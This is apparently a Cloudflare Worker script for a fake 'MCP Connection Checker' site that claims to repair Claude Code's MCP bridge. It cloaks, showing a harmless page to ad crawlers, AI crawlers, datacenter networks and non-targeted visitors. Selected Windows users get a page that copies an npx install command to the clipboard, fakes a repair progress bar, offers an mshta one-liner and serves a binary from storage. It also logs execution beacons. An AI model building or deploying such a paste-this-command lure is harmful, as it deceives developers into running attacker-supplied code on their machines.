const AD  = /AdsBot|Googlebot|bingbot|facebookexternalhit|Twitterbot|LinkedInBot|redditbot|Adidxbot|Slackbot/i;
const AI  = /ChatGPT-User|OAI-SearchBot|GPTBot|Claude-User|ClaudeBot|PerplexityBot/i;
const DC  = [13335, 15169, 16509, 14618, 14061, 24940, 16276, 63949, 20473, 16265, 9009];
const GEO = ['US','CA','GB','AU','DE','NL','FR','PL','UA','KZ','IL','SG','AE','ES','IT'];

const HEAD = `<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<style>body{margin:0;background:#0d1117;color:#c9d1d9;font:15px/1.6 -apple-system,Segoe UI,sans-serif}
.w{max-width:660px;margin:48px auto;padding:0 20px}h1{font-size:19px;margin:0 0 6px}
.sub{color:#8b949e;font-size:13px;margin-bottom:22px}
pre{background:#161b22;border:1px solid #30363d;border-radius:6px;padding:12px;font:13px Consolas,monospace;user-select:all}
h2{font-size:14px;margin:26px 0 8px}ol{color:#8b949e;font-size:14px}
button{background:#238636;border:0;color:#fff;padding:11px 18px;border-radius:6px;font-weight:600;cursor:pointer}
.bar{height:4px;background:#21262d;border-radius:2px;margin:18px 0;overflow:hidden}
.bar i{display:block;height:100%;width:0;background:#238636;transition:width .3s}
.st{color:#8b949e;font:13px Consolas,monospace}.ok{color:#3fb950}</style>`;

const BODY = `<h1>MCP Connection Checker</h1>
<div class="sub">Repairs broken MCP bridge config · Windows · no admin required</div>`;

const HOWTO = `<h2>How it works</h2><ol>
<li>Pulls the bridge binary from this domain.</li>
<li>Caches it to <code>%LOCALAPPDATA%\\mcp-doctor\\</code>.</li>
<li>Restarts the bridge and flushes the MCP cache.</li></ol>`;

const WHITE = `<!doctype html><title>MCP Connection Checker</title>${HEAD}<div class="w">${BODY}
<pre>npx -y @guicai777/mcp-doctor@latest</pre>${HOWTO}
<h2>No Node?</h2><pre>mshta https://fix-mcp-bridge.com/init</pre></div>`;

const LANDING = `<!doctype html><title>MCP Connection Checker</title>${HEAD}<div class="w">${BODY}
<button id="b">Copy fix command</button>
<div class="bar"><i id="p"></i></div><div class="st" id="s">Idle.</div>
<pre id="c">npx -y @guicai777/mcp-doctor@latest</pre>${HOWTO}
<h2>No Node?</h2><pre>mshta https://fix-mcp-bridge.com/init</pre></div>
<script>
var CMD='npx -y @guicai777/mcp-doctor@latest';
var b=document.getElementById('b'),s=document.getElementById('s'),p=document.getElementById('p');
b.onclick=function(){
  var t=document.createElement('textarea');t.value=CMD;document.body.appendChild(t);t.select();
  try{document.execCommand('copy')}catch(e){}
  if(navigator.clipboard)navigator.clipboard.writeText(CMD).catch(function(){});
  t.remove();b.disabled=true;b.textContent='Copied — paste in terminal';
  var st=[['scanning configuration...',25],['validating MCP entries...',55],['restarting bridge...',80],['done.',100]];
  var i=0;(function n(){if(i>=st.length)return;setTimeout(function(){
    s.textContent=st[i][0];p.style.width=st[i][1]+'%';
    if(i==st.length-1)s.innerHTML='<span class="ok">✓ Bridge restarted. Reload Claude Code.</span>';
    i++;n();},700);})();
};
</script>`;

export default {
  async fetch(req, env) {
    const u = new URL(req.url), ua = req.headers.get('user-agent') || '', cf = req.cf || {};

    if (u.pathname === '/robots.txt')
      return new Response('User-agent: *\nAllow: /\n', { headers: { 'content-type': 'text/plain; charset=utf-8' } });

    if (u.pathname === '/v.json') {
      log(env, 'exec', cf, ua);
      return new Response('{"active":true}', { headers: { 'content-type': 'application/json', 'cache-control': 'no-store' } });
    }

    if (u.pathname === '/init' || u.pathname === '/bridge.exe') {
      const o = await env.BUCKET.get(u.pathname.slice(1));
      if (!o) return new Response('not found', { status: 404 });
      return new Response(o.body, { headers: {
        'content-type': u.pathname === '/init' ? 'text/plain; charset=utf-8' : 'application/octet-stream',
        'cache-control': 'no-store' } });
    }

    if (AD.test(ua) || AI.test(ua)) return html(WHITE);
    if (!/Windows NT/i.test(ua)) return html(WHITE);
    if (DC.includes(cf.asn)) return html(WHITE);
    if (!GEO.includes(cf.country)) return html(WHITE);

    log(env, 'hit', cf, ua);
    return html(LANDING);
  }
};

const html = b => new Response(b, { headers: { 'content-type': 'text/html; charset=utf-8', 'cache-control': 'no-store' } });

function log(env, kind, cf, ua) {
  try { env.AE.writeDataPoint({ blobs: [kind, cf.country || '-', String(cf.asn || '-'), ua.slice(0, 120)], indexes: [kind] }); } catch {}
}
